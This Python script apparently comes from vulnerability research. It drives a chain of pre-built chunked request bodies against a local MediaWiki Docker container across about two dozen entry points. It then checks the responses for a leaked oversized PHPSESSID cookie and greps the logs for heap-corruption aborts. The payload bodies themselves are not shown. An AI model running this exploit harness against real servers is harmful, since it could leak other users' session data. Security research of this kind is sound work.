#!/usr/bin/env python3
"""Scan stock MW entrypoints: does the leaked Set-Cookie get delivered before the child aborts?"""
import os, re, socket, subprocess, sys, time, json, hashlib

AD = '/tmp/opencode/research/9bie_addendum_20261022T160000Z/scripts'
sys.path.insert(0, AD)
import chain_app as ca  # noqa

BODY_DIR = '/tmp/opencode/research/9bie_fullchain_multiw_20261022T130520Z/bodies'
A1 = open(os.path.join(BODY_DIR, 'a1.bin'), 'rb').read()
B1 = open(os.path.join(BODY_DIR, 'b1_800k.bin'), 'rb').read()

C = 'mw109619-ap-8426'
PORT = 18730
OUT = sys.argv[1] if len(sys.argv) > 1 else 'receipts/scan_mw'

VARIANTS = [
    ('index', '/index.php'),
    ('index_title', '/index.php?title=Main_Page'),
    ('index_blank', '/index.php?title=Special:BlankPage'),
    ('index_raw', '/index.php?title=Main_Page&action=raw'),
    ('index_render', '/index.php?title=Main_Page&action=render'),
    ('load', '/load.php'),
    ('load_startup', '/load.php?lang=en&modules=startup&only=scripts&raw=1'),
    ('api', '/api.php'),
    ('api_query', '/api.php?action=query&meta=siteinfo&format=json'),
    ('opensearch', '/opensearch_desc.php'),
    ('rest', '/rest.php'),
    ('img_auth', '/img_auth.php'),
    ('thumb', '/thumb.php'),
    ('index_pad1k', '/index.php?title=Main_Page&x=' + 'A' * 1024),
    ('index_pad8k', '/index.php?title=Main_Page&x=' + 'A' * 8192),
    ('index_pad32k', '/index.php?title=Main_Page&x=' + 'A' * 32768),
    ('lang_xsy', '/languages/messages/MessagesXsy.php'),
    ('lang_jut', '/languages/messages/MessagesJut.php'),
    ('lang_en_rtl', '/languages/messages/MessagesEn_rtl.php'),
    ('vendor_apex', '/vendor/oojs/oojs-ui/php/themes/ApexTheme.php'),
    ('vendor_signal', '/vendor/web-auth/webauthn-lib/src/Signal/Signal.php'),
    ('rdbms_pgblob', '/includes/libs/Rdbms/Encasing/PostgresBlob.php'),
    ('tests_success', '/tests/phpunit/includes/Shell/bin/success_status.php'),
    ('vendor_autoload_real', '/vendor/composer/autoload_real.php'),
    ('incl_defines', '/includes/Defines.php'),
    ('mw_autoload', '/autoload.php'),
]

COOKIE_RE = re.compile(rb'Set-Cookie: PHPSESSID=([^\r\n]*)')

def sh(cmd, timeout=30, **kw):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout, **kw)

def restart():
    sh(f'docker restart {C}', timeout=60)
    time.sleep(2.0)

def trunc_log():
    sh(f'docker exec {C} sh -c \': > /var/log/apache2/p2s-access.log\'', timeout=20)

def access_log():
    r = sh(f'docker exec {C} cat /var/log/apache2/p2s-access.log', timeout=20)
    return r.stdout

def php_errors(marker):
    r = sh(f'docker logs {C} --since 3m 2>&1', timeout=30)
    lines = [l for l in r.stdout.splitlines() if marker in l]
    return lines[-20:]

def detect(resp):
    if len(resp) >= 100000:
        return {'leak': 'size', 'bytes': len(resp)}
    m = COOKIE_RE.search(resp)
    if m and len(m.group(1)) > 1000:
        return {'leak': 'cookie', 'cookie_len': len(m.group(1))}
    return None

def run_variant(name, path):
    rec = {'name': name, 'path': path, 'stages': []}
    restart()
    trunc_log()
    # A1 with retries on connection refused
    for attempt in range(12):
        try:
            r = ca.send_chunked(PORT, path, A1, 180)
            break
        except OSError as e:
            rec.setdefault('a1_retries', []).append(repr(e))
            time.sleep(0.5)
    else:
        rec['error'] = 'a1 connect failed'
        return rec
    rec['a1'] = {'status': ca.status_of(r), 'bytes': len(r)}
    time.sleep(0.2)
    log = access_log()
    posts = [l for l in log.splitlines() if ' POST ' in l]
    a1_pid = posts[-1].split()[0] if posts else '?'
    rec['a1_child'] = a1_pid
    hit = None
    for i in range(8):
        try:
            t0 = time.time()
            r = ca.send_chunked(PORT, path, B1, 180)
            st = {'i': i, 'status': ca.status_of(r), 'bytes': len(r), 'elapsed': round(time.time()-t0, 2)}
            d = detect(r)
            if d:
                st.update(d)
                hit = st
        except OSError as e:
            st = {'i': i, 'error': repr(e)}
        rec['stages'].append(st)
        if hit:
            break
    rec['hit'] = hit
    # who died?
    log = access_log()
    rec['access_tail'] = [l for l in log.splitlines() if ' POST ' in l][-10:]
    errs = sh(f'docker logs {C} --since 2m 2>&1', timeout=30).stdout
    rec['aborts'] = [l for l in errs.splitlines() if 'exit signal Abort' in l or 'zend_mm_heap corrupted' in l or 'Session ID is too long' in l][-10:]
    return rec

def main():
    os.makedirs(OUT, exist_ok=True)
    results = []
    only = os.environ.get('ONLY')
    if os.environ.get('NEWONLY'):
        VARIANTS[:] = VARIANTS[16:]
    for name, path in VARIANTS:
        if only and only not in name:
            continue
        print(f'== {name} {path[:80]}', flush=True)
        try:
            rec = run_variant(name, path)
        except Exception as e:
            rec = {'name': name, 'error': repr(e)}
        results.append(rec)
        with open(os.path.join(OUT, 'scan.json'), 'w') as fh:
            json.dump(results, fh, indent=1)
        print('   a1', rec.get('a1'), 'child', rec.get('a1_child'), 'hit', rec.get('hit'), flush=True)
        print('   stages', [(s.get('i'), s.get('status'), s.get('bytes')) for s in rec.get('stages', [])], flush=True)

if __name__ == '__main__':
    main()
